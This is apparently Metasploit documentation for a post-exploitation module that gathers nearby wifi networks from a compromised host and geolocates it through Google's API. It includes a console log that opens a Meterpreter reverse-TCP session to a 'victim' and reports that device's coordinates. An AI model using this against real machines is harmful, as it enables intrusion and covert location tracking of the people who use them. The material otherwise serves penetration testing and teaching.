## Creating A Testing Environment

  For this module to work you need a box with a wireless adapter.  The following methods are used to gather
  wireless information from the host:
  
  - Windows: `netsh wlan show networks mode=bssid`
  - OSX: `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s`
  - Linux: `iwlist scanning`
  - Solaris: `dladm scan-wifi`
  - BSD: `dmesg | grep -i wlan | cut -d ':' -f1 | uniq"`
  - Android: [WifiManager](https://developer.android.com/reference/android/net/wifi/WifiManager)
  
  If `GEOLOCATE` is set to true, Google's [GeoLocation APIs](https://developers.google.com/maps/documentation/geolocation/intro) are utilized.
  These APIs require a Google [API key](https://developers.google.com/maps/documentation/geolocation/get-api-key) to use them.  The original
  methodology used by this module in [#3280](https://github.com/rapid7/metasploit-framework/pull/3280),
  which didn't require an API key, was found to no longer work in [#8928](https://github.com/rapid7/metasploit-framework/issues/8928).  
  
## Verification Steps

  1. Start msfconsole
  2. Obatin a meterpreter session via whatever method
  3. Do: `use post/multi/gather/wlan_geolocate`
  4. Do: `set session #`
  5. Do: `set apikey [key]`
  5. Do: `run`

## Options

  **geolocate**
  
  A boolean on if wireless information should only be gathered, or the Google geolocate API should be used to geo the victim.  Defaults to `false`
  
  **apikey**

  A string containing the Google provided geolocation api key. **REQUIRED** if `geolocate` is set to true. Defaults to empty string

## Scenarios

### Windows 10

	resource (met_rev.rc)> use exploit/multi/handler
	resource (met_rev.rc)> set payload windows/meterpreter/reverse_tcp
	payload => windows/meterpreter/reverse_tcp
	resource (met_rev.rc)> setg lhost 2.2.2.2
	lhost => 2.2.2.2
	resource (met_rev.rc)> set lport 9876
	lport => 9876
	resource (met_rev.rc)> setg verbose true
	verbose => true
	resource (met_rev.rc)> exploit
	[*] Exploit running as background job 0.
	[*] Started reverse TCP handler on 2.2.2.2:9876 
	[*] Sending stage (179267 bytes) to 1.1.1.1
	[*] Meterpreter session 1 opened (2.2.2.2:9876 -> 1.1.1.1:16111) at 2017-10-01 19:27:15 -0400
	
	resource (met_rev.rc)> use post/multi/gather/wlan_geolocate
	resource (met_rev.rc)> set geolocate true
	geolocate => true
	resource (met_rev.rc)> set session 1
	session => 1
	resource (met_rev.rc)> set apikey ANza1yFLhaK3lreck7N3S_GYbEtJE3gGg5dJe12
	apikey => ANza1yFLhaK3lreck7N3S_GYbEtJE3gGg5dJe12
	msf post(wlan_geolocate) > run
	[+] Wireless list saved to loot.
	[*] Google indicates the device is within 30.0 meters of 30.3861197,-97.7385878.
	[*] Google Maps URL:  https://maps.google.com/?q=30.3861197,-97.7385878
	[*] Post module execution completed
